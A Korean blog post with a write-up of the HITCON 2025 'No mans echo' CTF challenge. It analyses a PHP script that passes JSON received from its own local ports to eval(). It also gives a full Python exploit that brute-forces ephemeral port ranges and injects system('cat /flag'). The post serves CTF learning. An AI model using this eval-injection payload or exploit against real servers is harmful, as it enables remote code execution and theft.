---
layout: post
title: "Hitcon Writeup(No mans echo)"
tags: [정보보안, CTF]
comments: true
---

2025 Hitcon Wirteup 입니다

--- 

## (1) 문제 

php로 작동하는 웹사이트가 존재함.

```php
<?php
$probe = (int)@$_GET['probe'];
$range = range($probe, $probe + 42);
shuffle($range);
foreach ($range as $k => $port) {
$target = sprintf("tcp://%s:%d", $_SERVER['SERVER_ADDR'], $port);
$fp = @stream_socket_client($target, $errno, $errstr, 1);
    if (!$fp) continue;
    stream_set_timeout($fp, 1);
    fwrite($fp, file_get_contents("php://input"));
    $data = fgets($fp);
    if (strlen($data) > 0) {
    $data = json_decode($data);
    if (isset($data->signal) && $data->signal == 'Arrival')
    eval($data->logogram);
    
    fclose($fp);
    exit(-1);
    }
} 
highlight_file(__FILE__);
```

### 1-1. probe 파라미터로 입력 받기

```php 
$probe = (int)@$_GET['probe'];
```
- GET 파라미터 'probe'에서 숫자 값을 받아 정수형으로 변환하고 내부 포트 범위 시작 번호로 사용함

### 1-2. 포트 범위 생성 및 무작위로 섞기

```php
$range = range($probe, $probe + 42);
shuffle($range);
```

- probe부터 probe+42까지 총 43개의 연속 포트 번호 배열 생성
- 배열을 무작위로 섞는 과정임

### 1-3. 각 포트에 대해 TCP 연결 시도

```php
foreach ($range as $k => $port) {
    $target = sprintf("tcp://%s:%d", $_SERVER['SERVER_ADDR'], $port);
    $fp = @stream_socket_client($target, $errno, $errstr, 1);
    if (!$fp) continue;
```
- 서버 자신의 내부 IP 주소(```$_SERVER['SERVER_ADDR']```)와 포트 번호를 조합하여 TCP 주소 생성
- ```stream_socket_client```로 최대 1초 동안 해당 포트에 TCP 연결 시도, 실패하면 다음 포트 탐색

### 1-4. 연결 성공 시 데이터 송수신 처리

```php
    stream_set_timeout($fp, 1);
    fwrite($fp, file_get_contents("php://input"));
    $data = fgets($fp);
```
- 연결된 소켓에 대해 읽기 타임아웃 1초 설정
- 현재 HTTP 요청의 바디(raw POST 데이터) 전체를 해당 TCP 연결에 사용함

### 1-5. 받은 데이터가 있을 때 데이터 처리

```php
    if (strlen($data) > 0) {
        $data = json_decode($data);
        if (isset($data->signal) && $data->signal == 'Arrival')
            eval($data->logogram);
        
        fclose($fp);
        exit(-1);
    }

```
- 받은 응답의 길이가 0 초과면 JSON으로 파싱
- JSON 객체 안에 ```signal``` 속성이 있고 값이 `"Arrival"`이면
- ```logoram``` 속성 값을 PHP 코드로 간주해 ```eval()``` 함수로 실행함. 이때 임의코드 실행 취약점이 발생
- 소켓 닫고 스크립트 종료

### 1-6. 위 조건이 없으면 다음 포트를 계속 탐색
- 조건이 만족되지 않거나 연결 실패 시 다음 포트 탐색

### 1-7. 마지막으로 현재 소스 코드 화면에 출력
```php
highlight_file(__FILE__);
```
- 직접 접근했을 때 이 PHP 파일의 소스가 하이라이팅된 상태로 표시됨

### 1-8. 문제 요약
> 사용자가 probe 값으로 지정한 포트부터 43개의 포트를 무작위로 내부 IP에서 TCP 연결을 시도하고, POST 요청의 본문을 해당 포트에 보내고, 연결된 곳에서 JSON 형태의 응답이 signal="Arrival" 일 경우 eval로 전달된 PHP 코드를 실행함으로써 내부 시스템에 원격으로 코드를 실행할 수 있도록 설계되어 있는 구조임


## (2) 풀이
- 웹사이트에 직접 연결을 시도하면 부하가 발생함으로 도커 이미지를 생성해서 풀이를 진행함.

### 2-1. Docker 빌드
``` no-mans-echo_chall-76a916a81207254228c87f29b3364225471f9bad.tar.gz ```
문제 파일 다운로드함. 압축 해제 후 해당 폴더로 진입해서 
``` docker build -t no-mans-echo .``` 
도커 이미지를 빌드함. 
- 이후 도커 컨테이너 실행 및 포트 매핑 ```docker run -d -p 8080:8080 --name no-mans-echo no-mans-echo```

<img width="592" height="460" alt="스크린샷 2025-08-30 오후 11 17 57" src="https://github.com/user-attachments/assets/1476fff4-7de4-4970-adc7-544180efcfa3" />

도커 이미지 빌드가 제대로 되었다면 `http://localhost:8080/`로 접근했을 때 index.php가 정상 출력됨

`user@gimtaehyeon-ui-MacBookAir no-mans-echo-docker % docker ps`

`CONTAINER ID   IMAGE          COMMAND                   CREATED        STATUS        PORTS                                     NAMES
ac82ddf52c69   no-mans-echo   "apachectl -D FOREGR…"   11 hours ago   Up 10 hours   0.0.0.0:8080->80/tcp, [::]:8080->80/tcp   no-mans-echo`

실행 중인 컨테이너 ID 확인 후

`user@gimtaehyeon-ui-MacBookAir no-mans-echo-docker % docker exec -it ac82ddf52c69 bash`

`root@ac82ddf52c69:/var/www/html# `

컨테이너 진입

### 2-2. 취약점 분석
공격 대상인 `index.php`의 구조를 확인해보면 `probe`라는 GET 파라미터를 받아 해당 포트 범위를 지정하고, 내부 TCP 포트로 직접 연결을 시도하는 구조임.

특히, `stream_socket_client`로 내부 IP와 포트에 연결해 POST 바디 데이터를 직접 적재하고, 응답 JSON을 `eval` 실행하도록 되어 있음. `eval` 함수가 외부 입력(`logogram`)을 그대로 실행하므로, 공격자는 명령어를 삽입해 원격에서 임의 코드를 실행할 수 있는 취약점이 발생함.

위에 `index.php`의 작동 원리 설명처럼, `signal` 필드가 `"Arrival"`일 때, `logogram` 필드에 담긴 내용을 `eval()` 호출하여 PHP 코드로 실행함.

우리는 `'cat /flag'`을 통해 키 값을 추출해볼거임.

그러면 실제 전송할 JSON 페이로드는 다음과 같음

```JSON
{
  "signal": "Arrival",
  "logogram": "echo \"__HIT__\n\"; system('cat /flag');"
}
```

### 2-3. 공격 페이로드 작성
운영체제마다 다르지만 리눅스에선 임시 포트가 32768에서 60999 사이에 할당되므로 요첨 범위를 설정해줌.

```python
EPHEMERAL_MIN = 32768
EPHEMERAL_MAX = 60999  # PHP 코드가 43개 포트 범위로 요청하므로 넉넉하게 잡음
MAX_TRIES = 10000  # 최대 시도 횟수 제한
```
JSON 페이로드를 보내기 위해 URL를 구성하고 페이로드와 헤더를 설정함.

```python
def send_attack(probe_start):
    url = f"{TARGET_URL}?probe={probe_start}"
    payload = payload_template.format(MAG)
    headers = {"Content-Type": "application/json"}

응답의 HTTP 상태 코드가 200이고 응답 본문에 `"__HIT__"`가 포함되어 있으면 공격 성공으로 간주하여 `flag`값을 출력함

```python
        if response.status_code == 200 and MAG in response.text:
            print(f">>> HIT probe={probe_start}")
            print("\n".join(response.text.splitlines()[:10]))
```
작성된 최종 python 코드는 다음과 같음
```python
import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor

# --- 설정 ---
TARGET_URL = "http://localhost:8080/index.php"
MAG = "__HIT__"  # PHP 코드가 echo하는 히트 마커
# JSON 페이로드: signal="Arrival"일 때 logogram 명령어 실행, 플래그 파일 cat 명령 포함
payload_template = '{{"signal":"Arrival","logogram":"echo \\"{}\\n\\"; system(\'cat /flag\');"}}'

EPHEMERAL_MIN = 32768
EPHEMERAL_MAX = 60999  # PHP 코드가 43개 포트 범위로 요청하므로 넉넉하게 잡음
MAX_TRIES = 10000  # 최대 시도 횟수 제한

def send_attack(probe_start):
    url = f"{TARGET_URL}?probe={probe_start}"
    payload = payload_template.format(MAG)
    headers = {"Content-Type": "application/json"}
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=3)
        if response.status_code == 200 and MAG in response.text:
            print(f">>> HIT probe={probe_start}")
            print("\n".join(response.text.splitlines()[:10]))
    except requests.RequestException:
        pass  # 예외 무시, 재시도 로직도 가능

if __name__ == "__main__":
    print("Start Exploit Attack")
    tries = 0
    with ThreadPoolExecutor(max_workers=50) as executor:
        while tries < MAX_TRIES:
            probe = random.randint(EPHEMERAL_MIN, EPHEMERAL_MAX - 42)
            executor.submit(send_attack, probe)
            tries += 1
            time.sleep(0.005)  # 서버 과부하 방지

    print("Finished attack loop.")
```

마지막 `ThreadPoolExecutor`는 python 표준 라이브러리 `concurrent.futures` 모듈에 있는 클래스로, 병렬 실행을 위해 50개의 스레드를 만들어 10,000회까지 반복하는 작업을 빠르게 처리할 수 있음.

### 2-4. 공격 페이로드 실행
<img width="919" height="72" alt="스크린샷 2025-08-31 오후 12 53 57" src="https://github.com/user-attachments/assets/31b7bb6a-ccc8-4f79-9473-c0707bb2fe09" />

CTF 서버에 exploit 하면 키값이 나옴

`hitcon{it's a beautiful day outside. birds are singing, flowers are blooming... kids like you... should be burning in h3ll}`


